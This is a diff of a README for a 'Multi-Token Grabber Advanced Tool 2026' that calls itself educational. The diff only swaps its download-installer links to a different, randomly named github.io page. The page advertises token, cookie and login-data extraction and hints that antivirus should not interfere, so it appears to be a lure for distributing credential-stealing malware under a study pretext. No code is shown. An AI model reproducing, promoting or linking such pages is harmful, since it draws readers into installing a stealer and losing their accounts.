@@ -2,7 +2,7 @@
 
 This is a Multi-Token Grabber Advanced Tool 2026, a software package designed as an educational resource to understand how session tokens, cookies, and login data are managed by modern applications. This project serves as a learning aid for cybersecurity students and developers to study session handling and data security in a controlled environment.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 - **Multi-Platform Token Extraction**: A technical demonstration tool that illustrates the process of session token retrieval across simulated application environments.
@@ -33,4 +33,4 @@ A: Ensure you have the necessary administrative rights and that no antivirus sof
 ## Download
 Access the full source documentation and educational materials from the official resource page.
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
